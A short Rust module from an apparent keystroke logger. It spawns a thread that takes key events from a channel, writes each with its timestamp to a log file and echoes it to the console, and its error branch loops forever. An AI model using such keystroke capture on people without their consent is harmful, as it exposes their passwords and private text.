use crate::event_listener::KeyEvent;
use std::fs::File;
use std::io::Write;
use std::sync::mpsc::Receiver;
use std::thread::{self, JoinHandle};

pub fn key_logger(rx: Receiver<KeyEvent>, mut log_file: File) -> JoinHandle<std::io::Result<()>> {
    thread::spawn(move || -> std::io::Result<()> {
        loop {
            match rx.recv() {
                Ok(entry) => {
                    let line = format!("{}, {:?}", entry.time_stamp, entry.key);
                    writeln!(log_file, "{}", line)?;
                    println!("{}", line);
                }
                Err(e) => {
                    eprintln!("{}", e);
                }
            }
        }
    })
}
